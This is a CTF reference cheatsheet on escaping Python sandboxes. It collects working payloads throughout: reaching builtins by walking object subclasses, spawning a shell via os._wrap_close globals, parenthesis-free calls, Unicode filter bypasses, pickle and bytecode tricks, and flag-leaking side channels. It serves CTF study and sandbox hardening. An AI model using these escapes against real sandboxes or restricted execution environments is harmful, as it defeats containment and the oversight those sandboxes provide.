# Pyjail Escape Cheatsheet

> Source: **CTF Writeups by @jiegec (Jiajie Chen)** — https://jia.je/ctf-writeups/misc/pyjail.html
> Paraphrased/condensed for offline reference. Content was rephrased for compliance with licensing
> restrictions. See source for full per-challenge writeups.
> Also see: Pyjail Cheatsheet collections linked from the source.

Python jails restrict execution by filtering characters, banning builtins, or limiting operations.
Match the RESTRICTION to a bypass below.

---

## Assignment without `=`
- exec context: normal `a=1`.
- eval context: walrus `[a:=1]`.
- list comprehension: `[a for a in [1]]`; compact `[[a]for[a]in[[1]]]`.

## Numbers / booleans without digits
- `True` = 1: `[[]]>[]`, `not[]is[]`, `[]==[]`.
- `False` = 0: `[]>[]`, `[]is[]`.
- increment: `-~x` == `x+1`.
- also `(''=='')` as 1, `()<((),)` as 1.

## Strings without quotes
- extract chars from existing strings: `help.__doc__[index]`, `().__doc__.__getitem__(index)`, docstrings.
- `"%c%c" % (97,98)` to build strings (when `%` allowed).
- `\xXX` / unicode escapes inside allowed string literals.

## Function calls without parentheses
- `__import__('os')` alternatives:
  - `help.__class__.__getitem__ = __import__; help['os']`
  - `help.__class__.__contains__ = __import__('os').system; 'sh' in help`
  - `ExceptionGroup.__class_getitem__ = __import__; ExceptionGroup["os"]`
  - `help.__class__.__getattr__ = __import__; help.os`
- `breakpoint()` via `license._Printer__setup = breakpoint; str(license)`.
- `exec(input())` via decorators: `@exec` newline `@input` newline `class a: pass`.
- decorator call form generally: `@f` on a class/def calls `f` with it.

## Accessing builtins when banned
- Get `object` and walk subclasses:
  - `().__class__.__base__.__subclasses__()`
  - `().__class__.__mro__[1].__subclasses__()` / `...__mro__.__getitem__(1)...`
  - `().__setattr__.__objclass__.__subclasses__()`
  - tuple: `().__class__.__subclasses__()`; dict `{}.__class__.__subclasses__()`
- Get builtins from a class' globals:
  - `...__subclasses__()[os_wrap_close_index].__init__.__globals__["__builtins__"]`
  - `...__subclasses__()[codecs_codecinfo_index].__new__.__globals__["__builtins__"]`
- Or get shell WITHOUT builtins:
  - `...__subclasses__()[os_wrap_close_index].__init__.__globals__["system"]("sh")`
    - find index: `str(().__class__.__base__.__subclasses__()).split(", ").index("<class 'os._wrap_close'>")`
  - `...__subclasses__()[builtinimporter_index].load_module("os").system("sh")`
    - find index via `"<class '_frozen_importlib.BuiltinImporter'>"`
- When `__import__` available: `().__reduce_ex__(2)[0].__builtins__` or
  `().__reduce_ex__(2)[0].__globals__["__builtins__"]`.
- Via an exception frame: `except Exception as e: e.__traceback__.tb_frame.f_builtins`
  (or `f_globals["__builtins__"]`).

## Getting a shell (many gadgets)
`os.system("sh")`, `os.execl("/bin/sh","sh")`, `subprocess.Popen(['sh'])`,
`subprocess.check_call(['sh'])`, `pdb.set_trace()` / `pdb.run(src)` / `pdb.test()`,
`code.interact()` / `code.InteractiveConsole().interact()`, `breakpoint()`,
`pydoc.pipe_pager(text,cmd)` / `pydoc.tempfile_pager(text,cmd)`,
`_aix_support._read_cmd_output(cmd)`, `_osx_support._read_output(cmd)`, `doctest.debug_script(src)`.

## Character-filter bypasses
- **Unicode NFKC bypass**: use unicode chars that normalize to banned ASCII (e.g. fullwidth,
  Mathematical Alphanumeric Symbols for letters; FULLWIDTH LOW LINE for `_`; `ⅺ` for `xi`).
- **No spaces**: use `\f` (form feed) or `\r`.
- **No newlines**: use `\r` for multiline.
- **No `.` (attribute access)**: `getattr(A,"B")`, or `obj[name]` after setting
  `__getitem__`/`__getattr__`, or `__getattribute__` via lambda; limit-one-`.` → reuse via lambda.
- **No `[]`**: use `__getitem__(...)` calls.
- **No `'"`**: build strings from docstrings/`%c`/attribute names.

## Constraint-specific tricks (from real challenges)
- **len(set(input)) ≤ N** — reuse characters already present; exception side channel to leak flag byte-by-byte (`1/0` or index-OOB, compare guessed char).
- **input length limit** — raise the limit on the fly (override `len`, e.g. `len=all`), or `exit(flagbuf)` to leak.
- **must match a regex / "increasing length" / "prime length words" / collatz word-lengths** — pad
  names with `0000` in subscripts, hex literals `0x00000123`, slicing `"sh000"[:2]`, `'aa'.__len__()`.
- **at most one of `.,(+)`** — call step-by-step via `__getattribute__`, save intermediates in a list
  comprehension or in a `KeyError` exception (`{}[obj]`).
- **only alphabetic + `()` + `+`** — construct strings with `+`, use generator syntax + call (pyfuck).
- **JSFuck-style minimal charset** — build via allowed primitives.

## Pickle jails
- Banned REDUCE/INST/OBJ/NEWOBJ/GLOBAL etc. → use **BUILD** to overwrite instance attributes
  (e.g. set `license._Printer__setup = code.interact`, then `print(license)`), or override
  `pickle._Unpickler.pop_mark`/attributes and trigger via TUPLE/BINPERSID/NEXT_BUFFER.
- **STACK_GLOBAL** to avoid newlines; **BINPUT** to consume a leading UTF-8 byte as index.
- `find_class` limited to a module → abuse a callable with an exploitable default arg (e.g.
  `collections.namedtuple` field name reaching `eval`).

## Bytecode-restricted jails
- Limited opcode set (e.g. only POP_TOP/DUP_TOP/UNARY_INVERT/BINARY_ADD/POP_JUMP_IF_TRUE/EXTENDED_ARG)
  → synthesize arithmetic (subtract via invert+add, multiply via loops) and constants.
- **Stackless** (≤1 stack element per op) → use `CALL_FUNCTION` with pre-saved `B=A.method; B()`
  instead of `CALL_METHOD`.

## sys module access
- `datetime.sys` for Python ≤ 3.11; else find `sys` among object subclasses' globals.
